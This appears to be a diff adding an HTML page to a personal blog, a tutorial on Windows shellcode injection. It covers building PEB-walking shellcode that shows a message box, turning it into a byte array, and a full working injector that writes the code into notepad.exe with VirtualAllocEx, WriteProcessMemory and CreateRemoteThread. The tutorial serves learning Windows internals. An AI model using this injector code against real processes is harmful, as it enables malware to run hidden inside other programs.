@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shell code injection</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <h1 style="text-align: left;">
+        <a href="index.html" style="text-decoration: none; color: grey;">KhoaLeDang's Blog</a>
+    </h1>
+    <h1 style="text-align: center;">SHELL CODE INJECTION</h1>
+
+    <h2>1. Notes and Explanation</h2>
+
+    <p class="mynote">Hello, today I will talk about <strong>shell code injection</strong>
+        Shell code is a code that can work on it's self without importing the dll. For exampll when you need to open <code class="inlinecode">MessageBoxA</code> function you will need to <code class="inlinecode">LoadLibraryA(user32.dll)</code> to use it but
+        with shell code you have to load it manually. I will show you how to <strong>shell code injection</strong> using the <strong>PEB walk</strong> method it's similar to <strong><a href="FunctionFinder.html" style="text-decoration: none;">function finder</a></strong>. You can check it for more details.
+        The differences are I code all of them inside only 1 function, I use the <code class="inlinecode">pragma optimize</code> and all the words are in . I will tell you why I do that later.
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
+...
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+...
+}</code></pre>
+
+    <p class="mynote">As you can see here I still custom the <code class="inlinecode">LDR_DATA_TABLE_ENTRY</code> struct.</p>
+
+    <pre class="codeblock"><code class="codeblock">#pragma optimize("", off)
+extern "C" void entry_point() {
+	decltype(MessageBoxA)* pMessageBoxA = NULL;
+	decltype(GetProcAddress)* pGetProcAddress = NULL;
+	...</code></pre>
+
+    <p class="mynote">
+        I use the <code class="inlinecode">decltype</code> (Declaring type of the function or variable that's already exists inside <code class="inlinecode">windows.h</code>. The <code class="inlinecode">decltype</code> only knows inside <code class="inlinecode">windows.h</code> there's a function name <code class="inlinecode">MessageBoxA</code> needs 4 arguments and return int type) to create pMessageBoxA. Which is a pointer to the <code class="inlinecode">MessageBoxA</code> function.
+    </p>
+
+    <p class="mynote">
+        I have to do this because we load the function manually because we may be don't have that function in the host process. You can also see I use <code class="inlinecode">#pragma optimize("", off)</code>. I will talk about this later.
+    </p>
+
+    <pre class="codeblock"><code class="codeblock">	char u32[11] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' };
+	WCHAR k32[13] = { 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', '\0' };
+	...</code></pre>
+
+    <p class="mynote">
+        I create an array to hold string instead of "user32.dll" because when you do this it will a pointer that points to HEAP memory .rdata. But in shellcode injection we need all the codes inside .text to convert it into shellcode.
+    </p>
+
+    <p class="mynote">In asm it will mov bytes by bytes until the end so our string doesn't appear inside .rdata:</p>
+
+    <pre class="codeblock"><code class="codeblock">mov     [rsp+198h+var_130], 75h ; 'u'
+mov     [rsp+198h+var_12F], 73h ; 's'
+mov     [rsp+198h+var_12E], 65h ; 'e'
+mov     [rsp+198h+var_12D], 72h ; 'r'
+mov     [rsp+198h+var_12C], 33h ; '3'
+mov     [rsp+198h+var_12B], 32h ; '2'
+mov     [rsp+198h+var_12A], 2Eh ; '.'
+mov     [rsp+198h+var_129], 64h ; 'd'
+mov     [rsp+198h+var_128], 6Ch ; 'l'
+mov     [rsp+198h+var_127], 6Ch ; 'l'
+mov     [rsp+198h+var_126], 0
+}</code></pre>
+
+<p class="mynote">The rest are similar to <a href="FunctionFinder.html" style="text-decoration: none;">function finder</a> you can check it out for more details step about how I PEB walk</p>
+    <p class="mynote">That's our C <a href="SourceCode/SourceShellcodeC.html">Source Code</a>. I will show you how to convert it to shellcode.</p>
+    <h2>COMPILE</h2>
+    <h3>Tools used: VisualStudio, IDA, CFF explorer, HxD.</h3>
+    <p class="mynote">First step we need to change the compile configs so our code is as simple as possible for easier read. That's why I use #pragma optimize("", off) and I write all the code inside one big Functions.</p>
+    <p class="mynote">Go into <strong>Project Properties</strong> and change these settings:</p>
+    <ul>
+        <li>
+            <strong>C/C++ &rarr; Optimization</strong>
+            <ul>
+                <li><strong>Optimization</strong>: choose <code>Maximize speed (/O2)</code> – helps the code execute faster, but most importantly turns off runtime tests.</li>
+                <li><strong>Whole Program Optimization</strong>: choose <code>No</code> – prevents the compiler from stacking functions together.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>C/C++ &rarr; Code Generation</strong>
+            <ul>
+                <li><strong>Security check</strong>: set to <code>Disable Security Check (/GS-)</code> – removes the <code>__security_cookie</code>. If left enabled, shellcode may call a nonexistent function and crash.</li>
+                <li><strong>Basic Runtime Checks</strong>: set to <code>Default</code> – turns off <code>/RTC1</code>; stops the compiler from checking the C library stack (which doesn't exist for standalone shellcode).</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Linker &rarr; Input</strong>
+            <ul>
+                <li><strong>Ignore All Default Libraries</strong>: set to <code>Yes (/NODEFAULTLIB)</code> – removes the CRT, making sure your shellcode doesn't call any library functions except yours.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Linker &rarr; Advanced</strong>
+            <ul>
+                <li><strong>Entry Point</strong>: enter your entry function name – tells the linker which function is the entry point when dumping the <code>.text</code> section. Assembly will start from this function.</li>
+            </ul>
+        </li>
+    </ul>
+    <p class="mynote">Then build make sure you choose <strong>release mode</strong>.</p>
+    <h2>Converting C Code to Shellcode</h2>
+    <p class="mynote">
+        Once you've built your code, open the executable in IDA to inspect whether the <strong>.exe</strong> meets the requirements: it should contain only a single function and shouldn't reference any unexpected functions.
+    </p>
+    <img src="IMAGES/ShellCodeInjection/ShellcodeIDA.png" alt="IDA Shellcode view">
+    <p class="mynote">
+        If everything looks correct in IDA, use CFF Explorer to extract (<em>dump</em>) the <strong>.text</strong> section of your executable to a <strong>.bin</strong> file. This section contains your compiled shellcode.
+    </p>
+    <img src="IMAGES/ShellCodeInjection/ShellcodeCFF.png" alt="Dumping .text section with CFF Explorer">
+    <p class="mynote">
+        Next, open that <strong>.bin</strong> file using HxD. Select all the bytes, then use <strong>Edit → Copy as C</strong> to copy the shellcode as a C string literal. This will allow you to embed the shellcode directly into your C project or injector.
+    </p>
+    <img src="IMAGES/ShellCodeInjection/ShellcodeHxd.Png" alt="Shellcode viewed in HxD">
+    <p class="mynote">
+        This process allows you to transform your C source code into a usable shellcode byte array. Now that you have your shellcode in the correct format, you're ready to proceed to the next step: injecting it into a target process, which we'll cover in detail next. Mastering this transformation is key for both learning and practice in Windows internals and reverse engineering.
+    </p>
+    <h2>injector</h2>
+    <p class="mynote">I make a small .exe injector using CreateToolhelp32Snapshot to snap all the process and then look for notepad process to inject my shell code in.s</p>
+    <pre class="codeblock"><code class="codeblock">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt; 
+
+DWORD FindProcessId(const wchar_t* process_name) {
+    DWORD process_id = 0;
+    HANDLE snapshot_handle = NULL;
+    snapshot_handle =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot_handle != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe32 = { 0 };
+        pe32.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(snapshot_handle, &pe32)) {
+            do {
+                if (wcscmp(pe32.szExeFile, process_name) == 0) {
+                    process_id = pe32.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(snapshot_handle, &pe32));
+        }
+        CloseHandle(snapshot_handle);
+    }
+    return process_id;
+}
+
+// We find first process using Process32FirstW, Process32NextW and a do-while loop 
+// to go through all the processes. Compare process_name (e.g. "notepad.exe").
+// If found, return the PID.
+
+int main() {
+    unsigned char shellcode[2560] = {
+        0x48, 0x81, 0xEC, 0x98, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x00,
+        ... // Shellcode bytes from HxD
+    };
+    void* exec_mem = NULL;
+    HANDLE process_handle = NULL;
+    DWORD target_pid = FindProcessId(L"notepad.exe");
+    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+    exec_mem = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(process_handle, exec_mem, shellcode, sizeof(shellcode), NULL);
+    CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
+    printf("\nInjected PID: %d\n", target_pid);
+    return 0;
+}
+</code></pre>
+<p class="mynote">
+    To inject into a process, you need your <strong>shellcode</strong>, a target location, and memory for the shellcode. 
+    First, obtain shellcode bytes from HxD. Open the target process with <code>OpenProcess(..., PID)</code>.
+    Use <code>VirtualAllocEx()</code> to allocate space inside the target process. 
+    Use <code>WriteProcessMemory()</code> to copy your shellcode. 
+    Finally, create a thread to run your code via <code>CreateRemoteThread(exec_mem)</code>.
+</p>
+<a href="SourceCode/SourceInjector.html">Injector Source Code</a>
+<p class="mynote">
+    That's all for today, see you in the next blog!
+</p>
+</body>
+</html>
